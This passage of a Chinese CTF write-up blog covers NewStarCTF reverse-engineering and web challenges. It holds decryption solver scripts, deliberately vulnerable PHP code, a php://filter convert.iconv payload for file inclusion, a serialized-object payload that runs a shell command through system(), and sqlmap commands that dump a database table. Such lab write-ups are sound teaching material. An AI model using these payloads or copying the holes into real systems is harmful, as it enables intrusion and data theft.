<span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0xEE</span>, <span class="number">0xE6</span>, <span class="number">0xD7</span>, <span class="number">0xB2</span>, <span class="number">0x8A</span>, <span class="number">0xAB</span>, <span class="number">0x13</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x7B</span>, <span class="number">0xC9</span>, <span class="number">0xB9</span>, <span class="number">0x9C</span>, <span class="number">0xBA</span>, <span class="number">0xED</span>, <span class="number">0x2E</span>,<span class="number">0xBD</span>, <span class="number">0x4F</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0x16</span>, <span class="number">0x82</span>, <span class="number">0x63</span>, <span class="number">0x3B</span>, <span class="number">0x98</span>, <span class="number">0xF4</span>, <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0x38</span>,<span class="number">0x07</span>, <span class="number">0x36</span>, <span class="number">0x84</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x36</span>, <span class="number">0x32</span>, <span class="number">0xEA</span>, <span class="number">0x55</span>, <span class="number">0xA6</span> &#125;;</span><br><span class="line">    <span class="type">int</span> s,i,j;</span><br><span class="line">    srand(<span class="number">0x7261745377654E</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">42</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> ran_num = rand();</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            s = Table[(<span class="number">16</span> * ((<span class="type">unsigned</span> <span class="type">char</span>)(j + ran_num % <span class="number">255</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">15</span>) &amp; (<span class="type">unsigned</span> <span class="type">char</span>)(j + ran_num % <span class="number">255</span>)];</span><br><span class="line">            <span class="keyword">if</span> (s == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easy-enc"><a href="#easy-enc" class="headerlink" title="easy_enc"></a>easy_enc</h3><p>和上一个题其实是一个思路，主要也是要爆破，因为我们分析代码的时候发现在最后一个函数中，他有一个*58的操作，byte类型就溢出了，我们无法获取正确的加密后的函数，所以就可以进行单字节爆破，循环对数据进行加密操作，如果等于密文就输出原来的值就可以了</p>
<p>分析源码，一眼就是我们的加密后的数据，这些数据实际时连在一起的，但ida识别错误，我们可以通过对数据重新定义进行修改，或者直接动调去获取数据，因为他们是连在一起的</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4gue0ombvhq0.webp" alt="image"></p>
<p>然后就是上面的加密函数，这一段的意义其实就是调用我们的4个加密函数，对我们的字符串进行加密操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))v8[j])(Str);</span><br></pre></td></tr></table></figure>

<p>分析第一个加密函数，判断数据的范围然后进行数据修改，第二个加密函数是加key的操作，key也告诉我们了，第三个是对字符进行~操作，上面也解释了他的操作，最后一个就是一个*58的操作，会造成溢出，所以我们不能简单的去逆向出算法，最后选择进行单字节爆破的方式进行操作</p>
<p>对于脚本的知识了解，__uint8_t 其实就是unsigned char，~按位取反运算是单目运算，用来求一个位串信息按位的反，即哪些为0的位，结果是1，而哪些为1的位，结果是0。k *&#x3D; 52;最后会溢出</p>
<p>我试过使用int类型时使用vstudio进行动态，最后的值会很大，使用unsigned char的意义在于正好存在溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xE8</span>, <span class="number">0x80</span>, <span class="number">0x84</span>, <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x3C</span>, <span class="number">0x78</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x70</span>,</span><br><span class="line">      <span class="number">0x7C</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0xE0</span>, <span class="number">0x10</span>, <span class="number">0xEC</span>, <span class="number">0xB4</span>, <span class="number">0xAC</span>, <span class="number">0x68</span>, <span class="number">0xA8</span>,</span><br><span class="line">      <span class="number">0x0C</span>, <span class="number">0x1C</span>, <span class="number">0x90</span>, <span class="number">0xCC</span>, <span class="number">0x54</span>, <span class="number">0x3C</span>, <span class="number">0x14</span>, <span class="number">0xDC</span>, <span class="number">0x30</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k;</span><br><span class="line">    <span class="type">char</span> Str[] = <span class="string">&quot;NewStarCTF&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">32</span>; j &lt;= <span class="number">126</span>; j++) &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            <span class="keyword">if</span> (k &lt; <span class="number">65</span> || k &gt; <span class="number">90</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (k &lt; <span class="number">48</span> || k &gt; <span class="number">57</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &gt;= <span class="number">97</span> &amp;&amp; k &lt;=<span class="number">122</span>)</span><br><span class="line">                        k = (k - <span class="number">89</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    k = (k - <span class="number">45</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                k = (k - <span class="number">52</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            k += (<span class="type">int</span>)Str[i % <span class="built_in">strlen</span>(Str)];</span><br><span class="line">            k = ~k;</span><br><span class="line">            k *= <span class="number">52</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>) || (j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zeker62/p/15322771.html#phpfilter">✔PHP文件包含漏洞全面总结 - Zeker62 - 博客园 (cnblogs.com)</a></p>
<p>文件包含漏洞，可以使用各种伪协议进行读取文件，也分为本地文件包含和远程文件包含，本地文件包含就是可以使用比如</p>
<blockquote>
<p>file: &#x2F;&#x2F;伪协议<br>data:&#x2F;&#x2F; 伪协议<br>phar:&#x2F;&#x2F;伪协议<br>zip:&#x2F;&#x2F; 伪协议</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析源码，我们看到他对比普通的文件上传就多了一个base和rot的过滤，那么就是防止我们使用Conversion Filters中的base64</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php </p>
<p>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器_php:&#x2F;&#x2F;filter过滤器种类-CSDN博客</a></p>
<p>那么还有其他的很多过滤器，那么我们使用可以使用convert.iconv.*过滤器</p>
<blockquote>
<p>convert.iconv.<input-encoding>.<output-encoding>  or  convert.iconv.<input-encoding>&#x2F;<output-encoding></p>
</blockquote>
<p>那么我们就使用他utf-8和utf-7进行编码</p>
<blockquote>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php</p>
</blockquote>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231020200147972.png" alt="image-20231020200147972"></p>
<h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化 | Lazzaro (lazzzaro.github.io)</a></p>
<p>反序列化的题目</p>
<p>我们分析源码,看到这里只使用了一个魔法函数，destruct（#某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发），那么只要我们可以看到一个对象evil，我们只是赋值后并没有调用它，那么就会触发，我们就需要写一个序列化后的数据，他反序列后就会执行并调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们直接把他放到php的编译器中，首先调用这个对象，然后往里面传入值，这样就实现了调用类，并且system中的cmd赋予了命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里有个细节是cmd是私有变量，他的反序列和正常的反序列会有一点不同，但我发现在火狐是不可以直接穿的，但在谷歌浏览器的hackbar是可以的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/117336343">PHP——serialize()序列化类变量public、protected、private的区别_serialize变量名为protect_Ho1aAs的博客-CSDN博客</a></p>
<h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>一道游戏题目，我们直接去调试器里，查找和分数有关的名词，比如score</p>
<p>我们可以看到这个函数是就是管理如果分数达到100000就能看到flag</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132353950.png" alt="image-20231021132353950"></p>
<p>我们直接去调试器里控制台里，输入games，他就会自动弹出gamescore，并且告诉你现在的分数，那么我们直接输入即可</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132054978.png" alt="image-20231021132054978"></p>
<h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>sqlmap一把梭，我们首先在首页能看到几个按键，每个按键点击后都是一个get的传参，id&#x3D;xx，那么我直接抓包get传参的数据流，然后再sqlmap的主目录新建一个1.txt，存放这个数据流</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132942254.png" alt="image-20231021132942254"></p>
<p>首先：</p>
<p>查询是否可以找到数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure>

<p>查数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2z3o4kl5wik0.webp" alt="image"></p>
<p>查表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -D ctf -tables --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.12f1b96x3ti.webp" alt="image"></p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag --columns --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7041926o0hs0.webp" alt="image"></p>
<p>查数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D ctf -T here_is_flag -C flag --dump --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.70u11xfx8z80.webp" alt="image"></p>
<p>当请求延时的时候使用–delay 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch --delay 1</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73051164/article/details/133955827">记录分析做过的两道无参数 RCE 题-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406272.html">RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)</a></p>
<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><p>一道C++逆向的题目，记录一下C++逆向的思路</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6enz85e6lv40.webp"></p>
<p>分为作用域和函数，比如std就是一个作用域，我们可以分两种进行分辨</p>
<p>（1）对于一个语句，前面的全部都是作用域，只有最后是我们需要的函数</p>
<p>std::string::size(v13)</p>
<p>这一句就是前面std::string::都是作用域，直接看后面的size就知道他的作用是v13的长度</p>
<p>（2）除了这种情况就是中间不都是作用域，而是函数的值</p>
<p>v8 &#x3D; std::operator &lt;&lt;&lt;std::char_traits<char>&gt;(&amp;std::cout, “Wrong!!”);</p>
<p>例如以上这段，std以及中间这段就是作用域，我们可以读最后或者是作用域之后的值就是我们需要的函数比如这个就是对应着C++中的cout语句</p>
<p>cout &gt;&gt; ‘xxx’   对应上述就是利用的&lt;&lt;进行对应输出</p>
<p>std::reverse&lt;__gnu_cxx::__normal_iterator&lt;char *,std::string&gt;&gt;(v4, v3);</p>
<p>还有这段就是典型的，前面是作用域，后面就是函数，中间是作用域，对于后面要调用的数值的作用域，然后最后是引入的数值</p>
<p>我们分析逻辑：可以看到一开始是让你输入flag的值，存到v13中，且v13的值必须为44个大小，后续调用了re函数，对输入的数值进行逆置，然后对于逆置的数进行前后异或，本值等于本值与下一个值进行异或，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( std::string::length(v13) != <span class="number">44</span> )</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">std::reverse&lt;__gnu_cxx::__normal_iterator&lt;char*,std::string&gt;&gt;(v4, v3);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (std::string::size(v13) - <span class="number">1</span>); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *std::string::operator[](v13, i + <span class="number">1</span>);</span><br><span class="line">    v6 = std::string::operator[](v13, i);</span><br><span class="line">    *v6 ^= v5;</span><br></pre></td></tr></table></figure>



<p>PE指纹</p>
<p>MZ，PZ</p>
<h2 id="EzDLL"><a href="#EzDLL" class="headerlink" title="EzDLL"></a>EzDLL</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">int</span> keylen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> datalen)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;WOWOWOWWOWOWOW&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123; <span class="number">0xF4</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0xFA</span>, <span class="number">0x61</span>, <span class="number">0xA6</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x38</span>, <span class="number">0x97</span>, <span class="number">0x51</span>, <span class="number">0xA8</span>, <span class="number">0xDF</span>, <span class="number">0x85</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xB2</span>, <span class="number">0x15</span>, <span class="number">0xEF</span>, <span class="number">0x1F</span>, <span class="number">0xEC</span>, <span class="number">0x69</span>, <span class="number">0xDD</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0xCF</span>, <span class="number">0x07</span>, <span class="number">0xAE</span>, <span class="number">0xC8</span>, <span class="number">0x17</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>, <span class="number">0xA4</span>, <span class="number">0x0C</span>, <span class="number">0x87</span>, <span class="number">0x64</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0x71</span>, <span class="number">0x8C</span>, <span class="number">0x7F</span>, <span class="number">0xD7</span>, <span class="number">0x75</span>, <span class="number">0x84</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> keylen = <span class="built_in">strlen</span>((<span class="type">char</span>*)key);</span><br><span class="line"></span><br><span class="line">    Rc4_Init(s, key, keylen);</span><br><span class="line">    Rc4_Crypt(s, enc, <span class="keyword">sizeof</span>(enc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(enc); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">int</span> keylen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + s[i] + key[i % keylen]) % <span class="number">256</span>;</span><br><span class="line">        <span class="type">char</span> temp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> datalen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; datalen; i++) &#123;</span><br><span class="line">        j = (j + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        k = (k + s[j]) % <span class="number">256</span>;</span><br><span class="line">        temp = s[j];</span><br><span class="line">        s[j] = s[k];</span><br><span class="line">        s[k] = temp;</span><br><span class="line">        data[i] ^= s[(s[j] + s[k]) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-re做题记录" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
  	<time datetime="2023-09-23T07:26:20.000Z" itemprop="datePublished">2023-09-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
